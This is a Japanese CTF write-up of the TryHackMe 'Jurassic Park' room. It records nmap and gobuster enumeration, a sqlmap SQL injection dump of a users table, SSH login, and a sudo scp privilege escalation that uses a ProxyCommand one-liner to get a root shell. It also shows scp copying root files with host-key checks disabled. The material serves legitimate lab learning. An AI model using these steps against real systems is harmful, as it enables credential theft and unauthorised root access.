# Jurassic Park CTF

https://tryhackme.com/room/jurassicpark

## Enumeration

```shell
TARGET=10.146.148.232
sudo bash -c "echo $TARGET   jura.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

SSH, HTTPのみ。

```sh
root@ip-10-146-68-248:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.146.148.232
+ Target Hostname:    jura.thm
+ Target Port:        80
+ Start Time:         2026-04-02 01:53:44 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x11 0x5820759d53c9f 
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-04-02 01:53:46 (GMT1) (2 seconds)
---------------------------------------------------------------------------
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.146.148.232/ ----
==> DIRECTORY: http://10.146.148.232/assets/                                                                            
+ http://10.146.148.232/delete (CODE:200|SIZE:65)                                                                       
+ http://10.146.148.232/index.php (CODE:200|SIZE:1274)                                                                  
+ http://10.146.148.232/robots.txt (CODE:200|SIZE:17)                                                                   
+ http://10.146.148.232/server-status (CODE:403|SIZE:302)
```

robots.txt は謎の内容。

```sh
root@ip-10-146-68-248:~# curl http://$TARGET/robots.txt
Wubbalubbadubdub
```

```shell
root@ip-10-146-68-248:~# cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt
root@ip-10-146-68-248:~# gobuster dir -q -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 64 -k
/.php                 (Status: 403) [Size: 293]
/assets               (Status: 301) [Size: 317] [--> http://10.146.148.232/assets/]
/delete               (Status: 200) [Size: 65]
/index.php            (Status: 200) [Size: 1274]
/item.php             (Status: 200) [Size: 208]
/requests.txt         (Status: 200) [Size: 1]
/robots.txt           (Status: 200) [Size: 17]
/robots.txt           (Status: 200) [Size: 17]
/shop.php             (Status: 200) [Size: 2642]
```

requests.txt は 0 が入っている。

```sh
root@ip-10-146-68-248:~# curl http://jura.thm/requests.txt
0
```

/delete は、Ubuntuの権限昇格がありMySQLのパスワードが脆弱であることを示唆している。

```sh
root@ip-10-146-68-248:~# curl http://jura.thm/delete
New priv esc for Ubunut??

Change MySQL password on main system!
```

## SQLi

item.php に対してSQLi を手動で試したら脆弱性がありそうな感触だったのでsqlmapを実行。

park DBを発見。

```sh
$ sqlmap -r ./item.txt -p id --dbs --batch 

available databases [5]:
[*] information_schema
[*] mysql
[*] park
[*] performance_schema
[*] sys
```

items, users テーブルを発見。

```sh
$ sqlmap -r ./item.txt -p id -D park --tables --batch

Database: park
[2 tables]
+-------+
| items |
| users |
+-------+
```

テーブルの列

```sh
Table: users
[3 columns]
+----------+------------------+
| Column   | Type             |
+----------+------------------+
| id       | int(11) unsigned |
| password | varchar(11)      |
| username | varchar(11)      |
+----------+------------------+

Table: items
[5 columns]
+-------------+------------------+
| Column      | Type             |
+-------------+------------------+
| id          | int(11) unsigned |
| information | char(250)        |
| package     | varchar(11)      |
| price       | int(11)          |
| sold        | int(11)          |
+-------------+------------------+
```

usersテーブルダンプ。ユーザー名は空。

```sh
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | D0nt3ATM3 |          |
| 2  | [REDACTED]|          |
+----+-----------+----------+
```

itemsテーブルダンプ。dennis という名前が出ている。

```sh
Table: items
[5 entries]
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id  | sold | price  | package     | information                                                                                                                                                                            |
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1   | 4    | 500000 | Gold        | Childen under 5 can attend free of charge and will be eaten for free. This package includes a dinosaur lunch, tour around the park AND a FREE dinosaur egg from a dino of your choice! |
| 2   | 11   | 250000 | Bronse      | Children under 5 can attend free of charge and eat free. This package includes a tour around the park and a dinosaur lunch! Try different dino's and rate the best tasting one!        |
| 3   | 27   | 100000 | Basic       | Children under 5 can attend for free and eat free. This package will include a basic tour around the park in the brand new automated cars!                                             |
| 5   | 0    | 0      | Development | Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?                                                                                         |
| 100 | -1   | -1     | ...         | Nope                                                                                                                                                                                   |
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

2つ目のパスワードを使い、dennis でSSH接続できた。

## 列挙

```sh
dennis@ip-10-146-148-232:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04.5 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.5 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

.viminfo を見るとファイル操作の形跡がある。

```sh
# File marks:
'0  1  37  ~/.bash_history
'1  2  18  ~/test.sh
'2  2  18  /home/ubuntu/test.sh
'3  1802  31  /tmp/flagFour.txt
'4  1  63  ~/flag1.txt
'5  1  31  /boot/grub/fonts/flagTwo.txt
'6  1  0  /var/www/html/index.php
```

flagTwo は普通に読めた。flagFour は存在しない。

.bash_history を見ると、Flag3が出ていた。

```sh
dennis@ip-10-146-148-232:~$ cat .bash_history
Flag3:[REDACTED]
sudo -l
sudo scp
scp
sudo find
ls
vim test.sh
ls
cd ~
ls
vim test.sh
ls
ls -la
sudo scp -S test.sh
sudo scp /etc/password
sudo scp /etc/password localhost@10.8.0.6@~/
sudo scp /etc/passwd localhost@10.8.0.6@~/
sudo scp /etc/passwd dennis@10.0.0.59@~/
sudo scp /etc/passwd dennis@10.0.0.59:~/
sudo scp /etc/passwd dennis@10.0.0.59:/home/dennis
sudo scp /etc/passwd ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/ -v
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
sudo scp -v /root/flag5.txt ben@localhost:~/
sudo scp -v /root/flag5.txt dennis@localhost:~/
sudo scp -v /root/flag5.txt dennis@10.0.0.59:~/
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
ping 10.8.0.6
ping 10.8.0.7
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@88.104.10.206:~/
sudo scp -v /root/flag5.txt ben@88.104.10.206:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
ls
vim ~/.bash_history
```

残りは、/root/flag5.txt だけ。

scp を root として実行できる。

```sh
dennis@ip-10-146-148-232:~$ sudo -l
Matching Defaults entries for dennis on ip-10-146-148-232.us-west-2.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-146-148-232.us-west-2.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
```

## scp

シンプルに実行すると下記のエラーが出た。  
パスワード入力を求められればコピーできると思っていたが、鍵認証なのでこのままでは認証されない。  

```sh
dennis@ip-10-146-148-232:~$ sudo scp -v /root/flag5.txt dennis@localhost:~/
Executing: program /usr/bin/ssh host localhost, user dennis, command scp -v -t ~/
OpenSSH_7.2p2 Ubuntu-4ubuntu2.6, OpenSSL 1.0.2g  1 Mar 2016
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug1: Connecting to localhost [127.0.0.1] port 22.
debug1: Connection established.
debug1: permanently_set_uid: 0/0
debug1: key_load_public: No such file or directory
debug1: identity file /root/.ssh/id_rsa type -1
debug1: key_load_public: No such file or directory
debug1: identity file /root/.ssh/id_rsa-cert type -1
debug1: key_load_public: No such file or directory
debug1: identity file /root/.ssh/id_dsa type -1
debug1: key_load_public: No such file or directory
debug1: identity file /root/.ssh/id_dsa-cert type -1
debug1: key_load_public: No such file or directory
debug1: identity file /root/.ssh/id_ecdsa type -1
debug1: key_load_public: No such file or directory
debug1: identity file /root/.ssh/id_ecdsa-cert type -1
debug1: key_load_public: No such file or directory
debug1: identity file /root/.ssh/id_ed25519 type -1
debug1: key_load_public: No such file or directory
debug1: identity file /root/.ssh/id_ed25519-cert type -1
debug1: Enabling compatibility mode for protocol 2.0
debug1: Local version string SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
debug1: Remote protocol version 2.0, remote software version OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
debug1: match: OpenSSH_7.2p2 Ubuntu-4ubuntu2.6 pat OpenSSH* compat 0x04000000
debug1: Authenticating to localhost:22 as 'dennis'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256@libssh.org
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:hWZc6Ov/ok825yXd4rqNiXNI0Mb9qI1fH+iYeX68A78
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:hWZc6Ov/ok825yXd4rqNiXNI0Mb9qI1fH+iYeX68A78.
Please contact your system administrator.
Add correct host key in /root/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /root/.ssh/known_hosts:2
  remove with:
  ssh-keygen -f "/root/.ssh/known_hosts" -R localhost
ECDSA host key for localhost has changed and you have requested strict checking.
Host key verification failed.
lost connection
```

鍵ペアを生成し、公開鍵をdennisの信頼できる鍵として登録し、scpに秘密鍵を使って接続させれば成功すると考えた。

まず、鍵ペアを作成する。

```sh
dennis@ip-10-146-148-232:~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/dennis/.ssh/id_rsa): /home/dennis/root_id_rsa
...
```

dennis の信頼する鍵として登録する。

```sh
dennis@ip-10-146-148-232:~$ mkdir .ssh
dennis@ip-10-146-148-232:~$ cat ./root_id_rsa.pub > .ssh/authorized_keys
```

scpで秘密鍵を指定する。しかし、Not a directory という予想外なエラーが出た。

```sh
dennis@ip-10-146-148-232:~$ sudo scp -v /root/flag5.txt dennis@localhost:~/ -i /home/dennis/root_id_rsa
/home/dennis/root_id_rsa: Not a directory
```

このエラーの考察は後回しにして、[GTFObins](https://gtfobins.org/gtfobins/scp/#shell) の方法でrootシェルを取ってクリアした。

```sh
dennis@ip-10-146-148-232:~$ sudo scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -al /root
total 36
drwx------  4 root root 4096 Feb 16  2019 .
drwxr-xr-x 23 root root 4096 Apr  2 00:46 ..
-rw-------  1 root root   41 Feb 16  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root   33 Feb 16  2019 flag5.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  3 root root 4096 Feb 16  2019 snap
drwx------  2 root root 4096 Feb 16  2019 .ssh
-rw-------  1 root root  604 Feb 16  2019 .viminfo
```

## 振り返り

- Hardチャレンジとしては過去一簡単だった。完全にEasy。
- scp の件について考察した。

### 鍵生成による scp コピーでエラーになった件の考察

まず、Not a directory という予想外のエラーが出た原因は、-i オプションの位置が悪かったため。コピー先として認識されていた。

正しい位置で実行した結果が下記。

/root/.ssh/known_hosts に登録されていないホストへの接続のためセキュリティ的な意味でエラーになった。

```sh
dennis@ip-10-146-148-232:~$ sudo scp -v -i /home/dennis/root_id_rsa /root/flag5.txt dennis@localhost:~/
Executing: program /usr/bin/ssh host localhost, user dennis, command scp -v -t ~/
OpenSSH_7.2p2 Ubuntu-4ubuntu2.6, OpenSSL 1.0.2g  1 Mar 2016
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug1: Connecting to localhost [127.0.0.1] port 22.
debug1: Connection established.
debug1: permanently_set_uid: 0/0
debug1: identity file /home/dennis/root_id_rsa type 1
debug1: key_load_public: No such file or directory
debug1: identity file /home/dennis/root_id_rsa-cert type -1
debug1: Enabling compatibility mode for protocol 2.0
debug1: Local version string SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
debug1: Remote protocol version 2.0, remote software version OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
debug1: match: OpenSSH_7.2p2 Ubuntu-4ubuntu2.6 pat OpenSSH* compat 0x04000000
debug1: Authenticating to localhost:22 as 'dennis'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256@libssh.org
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:hWZc6Ov/ok825yXd4rqNiXNI0Mb9qI1fH+iYeX68A78
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:hWZc6Ov/ok825yXd4rqNiXNI0Mb9qI1fH+iYeX68A78.
Please contact your system administrator.
Add correct host key in /root/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /root/.ssh/known_hosts:2
  remove with:
  ssh-keygen -f "/root/.ssh/known_hosts" -R localhost
ECDSA host key for localhost has changed and you have requested strict checking.
Host key verification failed.
lost connection
```

ホストチェックを無しにして実行したところ、flag5のコピーに成功した。

```sh
dennis@ip-10-146-148-232:~$ sudo scp -v -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -i /home/dennis/root_id_rsa /root/flag5.txt dennis@localhost:~/
Executing: program /usr/bin/ssh host localhost, user dennis, command scp -v -t ~/
OpenSSH_7.2p2 Ubuntu-4ubuntu2.6, OpenSSL 1.0.2g  1 Mar 2016
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug1: Connecting to localhost [127.0.0.1] port 22.
debug1: Connection established.
debug1: permanently_set_uid: 0/0
debug1: identity file /home/dennis/root_id_rsa type 1
debug1: key_load_public: No such file or directory
debug1: identity file /home/dennis/root_id_rsa-cert type -1
debug1: Enabling compatibility mode for protocol 2.0
debug1: Local version string SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
debug1: Remote protocol version 2.0, remote software version OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
debug1: match: OpenSSH_7.2p2 Ubuntu-4ubuntu2.6 pat OpenSSH* compat 0x04000000
debug1: Authenticating to localhost:22 as 'dennis'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256@libssh.org
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:hWZc6Ov/ok825yXd4rqNiXNI0Mb9qI1fH+iYeX68A78
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
debug1: rekey after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey after 134217728 blocks
debug1: SSH2_MSG_EXT_INFO received
debug1: kex_input_ext_info: server-sig-algs=<rsa-sha2-256,rsa-sha2-512>
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Offering RSA public key: /home/dennis/root_id_rsa
debug1: Server accepts key: pkalg rsa-sha2-512 blen 279
debug1: Authentication succeeded (publickey).
Authenticated to localhost ([127.0.0.1]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending environment.
debug1: Sending env LANG = en_US.UTF-8
debug1: Sending command: scp -v -t ~/
Sending file modes: C0644 33 flag5.txt
Sink: C0644 33 flag5.txt
flag5.txt                                                                        100%   33     0.0KB/s   00:00    
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: channel 0: free: client-session, nchannels 1
debug1: fd 0 clearing O_NONBLOCK
debug1: fd 1 clearing O_NONBLOCK
Transferred: sent 2828, received 2896 bytes, in 0.3 seconds
Bytes per second: sent 11257.2, received 11527.9
debug1: Exit status 0
dennis@ip-10-146-148-232:~$ ls -al
total 60
drwxr-xr-x 4 dennis dennis 4096 Apr  2 01:46 .
drwxr-xr-x 5 root   root   4096 Apr  2 00:46 ..
-rw------- 1 dennis dennis 1001 Feb 16  2019 .bash_history
-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
-rw-r--r-- 1 dennis dennis 3771 Feb 16  2019 .bashrc
drwx------ 2 dennis dennis 4096 Apr  2 01:23 .cache
-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
-rw-r--r-- 1 dennis dennis   33 Apr  2 01:46 flag5.txt
-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
-rw------- 1 dennis dennis 1675 Apr  2 01:34 root_id_rsa
-rw-r--r-- 1 dennis dennis  406 Apr  2 01:34 root_id_rsa.pub
drwxrwxr-x 2 dennis dennis 4096 Apr  2 01:35 .ssh
-rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh
-rw------- 1 dennis dennis 4350 Feb 16  2019 .viminfo
```

## Tags

#tags:SQLi
